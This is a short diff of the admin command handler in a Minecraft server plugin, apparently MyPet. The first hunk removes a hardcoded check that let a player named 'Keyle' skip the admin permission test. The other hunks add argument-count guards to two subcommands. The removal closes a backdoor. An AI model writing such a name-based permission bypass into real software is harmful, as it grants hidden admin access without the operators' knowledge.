@@ -83,10 +83,7 @@ public class CommandAdmin implements CommandExecutor, TabCompleter
     {
         if (sender instanceof Player)
         {
-            if (Bukkit.getOnlineMode() && sender.getName().equals("Keyle"))
-            {
-            }
-            else if (!MyPetPermissions.has((Player) sender, "MyPet.admin", false))
+            if (!MyPetPermissions.has((Player) sender, "MyPet.admin", false))
             {
                 return true;
             }
@@ -293,6 +290,10 @@ public class CommandAdmin implements CommandExecutor, TabCompleter
         }
         else if (option.equalsIgnoreCase("skilltree"))
         {
+            if (args.length < 3)
+            {
+                return false;
+            }
             Player petOwner = MyPetBukkitUtil.getServer().getPlayer(args[1]);
 
             if (petOwner == null || !petOwner.isOnline())
@@ -327,6 +328,10 @@ public class CommandAdmin implements CommandExecutor, TabCompleter
         }
         else if (option.equalsIgnoreCase("create"))
         {
+            if (args.length < 3)
+            {
+                return false;
+            }
             MyPetType myPetType = MyPetType.getMyPetTypeByName(args[1]);
             if (myPetType != null)
             {
